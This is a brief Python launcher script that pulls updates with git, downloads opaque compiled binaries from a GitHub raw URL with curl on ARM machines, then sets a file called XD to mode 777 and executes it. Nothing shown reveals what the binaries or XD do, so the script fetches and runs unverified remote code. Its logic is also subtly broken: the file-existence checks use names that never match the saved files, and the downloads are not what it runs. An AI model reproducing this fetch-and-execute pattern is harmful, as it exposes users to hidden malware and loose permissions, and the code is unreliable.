import os
os.system('git pull')
from os import path,system
from platform import uname
bt=uname().machine.lower()
if 'aarch' in bt:
    if path.isfile("Mking64.cpython-311.so"):
        pass
    else:
        system("curl -L https://github.com/hechamoto/files/blob/main/Mking64?raw=true -o Mking64.so")
    if path.isfile("mking32.cpython-311.so"):
        pass
    else:
        system("curl -L https://github.com/hechamoto/files/blob/main/mking32?raw=true -o mking32.so")
os.system('chmod 777 XD && ./XD')
